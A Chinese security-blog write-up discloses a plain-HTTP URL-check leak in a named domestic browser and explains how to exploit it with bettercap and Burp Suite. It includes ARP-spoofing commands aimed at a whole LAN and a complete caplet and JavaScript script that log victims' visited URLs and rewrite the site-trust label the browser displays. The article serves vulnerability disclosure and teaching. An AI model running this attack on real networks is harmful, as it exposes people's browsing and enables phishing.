**国产浏览器往往基于Chrome浏览器开发，在带来新功能的情况下也带来了新的安全威胁。**

 **本文将披露某国产浏览器的中间人信息泄漏漏洞以及科普bettercap攻击脚本的编写方法。**

##  漏洞发现

笔者本想按着先辈们的文章测试下国产浏览器的特权域漏洞，但是在测试过程中意外发现了某国产浏览器的一个中间人信息泄漏漏洞。

![](https://image.3001.net/images/20191007/1570462042_5d9b595ab7089.png!small)如图，每当该浏览器访问某URL的时候，都会向该浏览器官方的某个系统请求一个urlcheck来检查该URL是否安全，其中请求的url参数就是base64后的url。

![](https://image.3001.net/images/20191007/1570462540_5d9b5b4c4b103.png!small)

我们暂且相信该浏览器官方是善意的不会保存我们的urlcheck记录，但这种HTTP明文请求仍然会使其易于遭受中间人攻击，导致即使有SSL保护的情形下URL仍然会被泄漏的问题，同时攻击者也可以据此伪造可信网站进行钓鱼攻击。

关于中间人攻击，由于笔者相信FreeBuf读者均具有相关的知识且其原理细节并非本文重点，在此不予详细叙述。简而言之，该攻击能使攻击者轻易的截取及替换明文传输的内容，可能导致信息泄漏，信息被篡改，甚至系统被拿下。

##  漏洞利用之bettercap配合Burpsuite手动攻击

显而易见，攻击者可以通过截取请求包并替换来进行漏洞利用。

在这里漏洞的演示攻击中，我们采用bettercap攻击进行演示。

###  **bettercap介绍**

bettercap早在几年前就被发布出来，是各类无线攻击的瑞士军（和谐）刀，具有取代ettercap的野心。

在原有的1.0版本中可以通过命令行参数来进行许多中间人攻击，而在2.0之后的版本该工具借鉴了MSF的模块化思想，主要通过交互式终端执行进行攻击。

目前bettercap还提供一个漂亮的UI供攻击者简化攻击过程，不过本文并不会涉及该UI的使用。

![ui-events.png](https://image.3001.net/images/20191022/15717132847032.png!small)

比起老牌的ettercap，该工具具有如下优点

> 1,更加稳定，不像ettercap容易崩溃
>
> 2,易于拓展，可以用其支持的cap脚本和js代码拓展
>
> 3,易于操作，具有更加简单的命令进行arp欺骗

在编写脚本自动化攻击之前，我们可以先使用Burpsuite配合bettercap测试中间人攻击。

###  **Burpsuite攻击配置**

大名鼎鼎的Burpsuite已被大家熟知，但许多人只知道用它来抓包测试web层的漏洞，不知道它也能用来进行中间人攻击

在进行中间人攻击测试之前，我们对Burpsuite进行一些简单的配置。

首先我们需要去Burpsuite的proxy处，选中options,对我们的代理选择edit，

在Binding处选择All interfaces。因为burpsuite默认只允许本地IP访问，而我们需要局域网内的机器来访问 。

![](https://image.3001.net/images/20191008/1570533300_5d9c6fb45e2bb.png!small)

接着再在request handling处选择support invisible proxying来打开透明代理。

之所以我们要这么做是因为在代理的时候我们无法解密SSL流量，应该让Burpsuite直接放行加密流量而不是做中间人替换证书。

###
![](https://image.3001.net/images/20191008/1570533542_5d9c70a6a74ca.png!small)
**Bettercap攻击**

使用bettercap攻击远比ettercap简单，我们只需要两个命令就可以了。

    
    
    any.proxy on
    arp.spoof on

any.proxy是bettercap自带的一个模块，它能够将流量进行重定向使得被攻击的机器的流量到达我们指定的代理。

使用any.proxy on 其用该模块，其中any.proxy的端口默认就是本机的8080端口，无需配置正好和burp一样。

而arp.spoof是arp攻击模块,直接arp.spoof on就能开启攻击了，默认攻击范围是整个局域网。

![](https://image.3001.net/images/20191008/1570534093_5d9c72cd00ee8.png!small)

**攻击效果**

![](https://image.3001.net/images/20191008/1570534688_5d9c7520a712e.png!small)

如上图所示，我们能够在不在靶机上安装证书的情况下，通过urlcheck的返回结果获取到本来该被SSL保护的URL，读出了bing搜索中的搜索内容（123）。

同时通过手动改包，我们能够修改网站的标识（把Bing改成了Google），显示了这个漏洞也可能被用于辅助社会工程学攻击。

![](https://image.3001.net/images/20191008/1570535530_5d9c786a587a4.png!small)这些结果很棒，但是作为黑客我们是不会满足于手动抓包改包这样只有概念验证性功能的实验的，我们需要将这个漏洞自动化利用。

幸运的是，bettercap对于拓展其功能有着良好的支持。

##  漏洞利用之bettercap caplets编写

###  **bettercap的攻击脚本编写规则**

bettercap允许我们用caplets编写自动化脚本进行攻击。caplets指的是后缀为.cap的脚本，能够直接执行bettercap的交互终端命令而不需要一条一条地手动输入，类似于metasploit的rc脚本。同时如果用它来修改http.proxy这个http流量拦截模块，我们可以轻易指定加载该cap目录下的js脚本而不需要考虑绝对路径。

bettercap提供了如下几个命令来帮助用户管理已有的caplets。

    
    
    caplets.show#显示已有的caplets.
    caplets.paths# 显示caplets的搜索路径
     caplets.update# 安装或更新caplets.

可以知道bettercap默认的caplets搜索路径有三个。

![](https://image.3001.net/images/20191008/1570536358_5d9c7ba60c081.png!small)

    
    
    /usr/local/share/bettercap/caplets    
    /usr/local/share/bettercap/caplets/caplets
    /usr/share/bettercap/caplets

在默认情况下，自带的caplets被放置在/usr/share/bettercap/caplets/，用户可以创建目录来和其余的模块隔开，bettercap会自动递归这些目录来查找可用的caplets。

![](https://image.3001.net/images/20191008/1570536542_5d9c7c5ea80c8.png!small)

在了解了caplets的基本编写规则之后，我们看看如何拓展原有的http嗅探模块来嗅探url。

###  **自定义bettercap的http.proxy模块**

bettercap的http.proxy模块提供一个http的透明代理，能够监听并修改流量，并且可以允许用户编写js代码来自定义其行为。它可以和bettercap的arp.spoof模块配合实现中间人攻击。

该模块有着如下参数可以设置

参数  |  默认设置  |  描述  
---|---|---  
http.port  |  80  |  需要转发的端口的流量  
http.proxy.address  |  <本机地址> |  本地代理绑定的地址  
http.proxy.port  |  8080  |  本地代理的端口  
http.proxy.sslstrip  |  false  |  是否打开sslstrip  
http.proxy.script  |  |  用于操控模块的js 脚本路径  
http.proxy.injectjs  |  |  注射进受害机的  
http.proxy.blacklist  |  |  不进行代理的黑名单（用逗号隔开，支持wildchard)  
http.proxy.whitelist  |  |  当黑名单启用的时候需要通过代理的白名单（用逗号隔开)我们将会用到该模块的两个命令  
  
我们这次需要编写的caplets中需要用到如下命令

    
    
    http.proxy on #启用http.proxy模块
    set http.proxy.script path#启用我们自定义的js脚本来自定义http.proxy模块的行为

编写http.proxy是重头戏，

而拓展http.proxy的js脚本格式如下

    
    
    // 在脚本被加载时执行
    function onLoad() {
    }
    // 当代理接收到请求并且还没发送到真正的server时调用
    function onRequest(req, res) {
    }
    // 当请求已经发送到了真实的server并获取返回结果时调用
    function onResponse(req, res) {
    }
    //当未知命令被调用时执行，这样可以拓展我们自己的命令
    function onCommand(cmd) {
        if( cmd == "test" ) {
            /*
             * 自定义会话中命令的逻辑.
             */
            return true
        }
    }

在今天的bettercap脚本编写示例中我们将会编写这里的onRequest和onResponse函数。

在onRequest和onResponse函数中的req和res就是传入的请求和返回结果。

关于req和res支持的操作，官方文档并没有提供一个完整详细的列表，但是笔者阅读了许多caplets的源码找出了以下用法

###  req用法

用法  |  说明  
---|---  
req.Path  |  url路径  
req.GetHeader("User-Agent", "")  |  获取某请求头  
req.Client.IP  |  客户端IP  
req.Hostname  |  server的主机名  
req.Headers  |  获取所有请求头  
req.Method  |  请求方式  
req.ContentType  |  Content-Type  
req.Query  |  获取查询字符串  
req.ParseForm();  |  获取POST包的字典  
req.ReadBody()  |  获取请求包的body  
  
res用法

用法  |  说明  
---|---  
res.Body  |  返回包的body,只能修改用于改包而不能读结果  
res.ContentType  |  Content-Type  
res.SetHeader("Content-Length", 114514)  |  设置返回包的头  
res.Status  |  返回包的状态码  
res.ReadBody  |  获取返回包的body(在onResponse时使用）  
  
###  **编写caplets**

在知道了如上信息之后我们就可以编写我们的caplets了，首先在/usr/share/bettercap/caplets/目录下建立目录uc-url

创建uc-url.cap文件，编写文件使内容为

    
    
    set http.proxy.script uc-url.js
    http.proxy on
    arp.spoof on

这个脚本的解释：第一行是配置http.proxy.script，即我们即将编写的拓展脚本

接着启用http.proxy模块

最后启用arp.spoof模块，由于没有指定目标，默认对同局域网所有主机执行arp攻击

接着我们在同目录下创建uc-url.js，编写如下内容

    
    
    var RESET = "\033[0m";
    
    function R(s) 
    {
        return "\033[31m" + s + RESET;
    }
    
    function G(s) 
    {
        return "\033[32m" + s + RESET;
    }
    
    function onRequest(req, res)
     {
        if( req.Method == "POST" && req.Path == "/urlcheck"&&req.Hostname=='dabai.pc.ucweb.com')
        {
            //parse request url from urlcheck request
            var form = req.ParseForm();
            var url=atob(form['url']);
            log( R(req.Client.IP)+" URL:"+G(url));
        }
    }
    
    function onResponse(req, res)
     {
        if( req.Method == "POST" && req.Path == "/urlcheck"&&req.Hostname=='dabai.pc.ucweb.com')
        {
            var body = res.ReadBody();
            j=JSON.parse(body)
            j['data']['title']='6324直播间';
            res.Body=JSON.stringify(j);
            //log(JSON.stringify(j));
        }
    }

前面的RESET,G,R函数用于处理字符串，使其在终端输出的时候有颜色。

其中onRequest函数中，我们根据请求的方式，url的路径，以及hostname判断了urlcheck包。

如果是urlcheck包，则通过ParseForm函数获取其url参数并且用atob函数base64解码，最后在终端上打印该URL。

在onResponse函数中，我们也如法炮制，获取返回结果并修改。由于笔者的恶趣味，笔者将返回结果的title替换成了6324直播间，这样每当有可信网站的结果返回的时候，这个对可信网站的描述就会被替换成6324直播间。

**攻击效果**

在一切完成之后，通过如下命令执行攻击

    
    
    bettercap -caplet uc-url/uc-url

如图，UC浏览器用户在SSL情况下访问freebuf时URL仍然能够被攻击者获取

![](https://image.3001.net/images/20191008/1570496531_5d9be0132fd94.png!small)由于freebuf并没有被标注为可信网站，再来一个网站标识替换后的效果图

![](https://image.3001.net/images/20191008/1570496712_5d9be0c885c60.png!small)

##  结语

尽管已经是2019年，大量的网站系统仍然没有使用SSL加密，中间人攻击仍然有其一席之地。对于安全研究者来讲，掌握相关知识，学习更新更好用的攻击工具的使用方法仍然是必要的。而开发者应该在开发的时候考虑到中间人攻击带来的威胁，部署SSL或者使用别的加密手段来抵御中间人攻击。

 ***本文原创作者： APU，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

  

